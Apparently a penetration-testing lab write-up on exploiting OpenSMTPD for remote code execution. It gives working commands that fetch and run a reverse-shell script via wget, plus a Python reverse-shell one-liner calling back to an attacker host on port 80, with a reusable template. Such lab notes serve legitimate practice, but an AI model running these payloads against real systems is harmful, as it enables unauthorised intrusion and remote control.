nmap shows ports 22 ssh, 25 smtp OpenSMTPD 2.0.0 , 53 dns, 80web open 

Nothing much in web
smtp is OpenSMTPD 2.0.0, we google for exploits, and we find something
It was metasploit, but the description said it exploits the "mail from" field

From clamAV, we have an exploit that mannually sends messages to the smtp server, but it has some bad chars issue when trying to create a reverse shell
So, we'll try to start a bind shell
Nothing works, fiddling too much with badchars

HINT TAKEN:
OpenSMTPD 6.6.1 - Remote Code Execution  - linux/remote/47984.py
```zsh
python opensmtpd_6.6.1_exploit.py 192.168.244.71 25 'wget 192.168.45.247/rshell.sh -O /dev/shm/rshell.sh'
python opensmtpd_6.6.1_exploit.py 192.168.244.71 25 'chmod + x /dev/shm/rshell.sh'
python opensmtpd_6.6.1_exploit.py 192.168.244.71 25 'bash /dev/shm/rshell.sh'
```
The file rshell.sh had a mkfifo 1-liner, sending shell to port 80 (other ports are apparantly blocked by firewall)

---
Alternate way to go around badchars is running a python command like so
`python3 exploit.py 192.168.192.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.212\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'`

`python3 47984.py TARGET 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LOCAL\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'`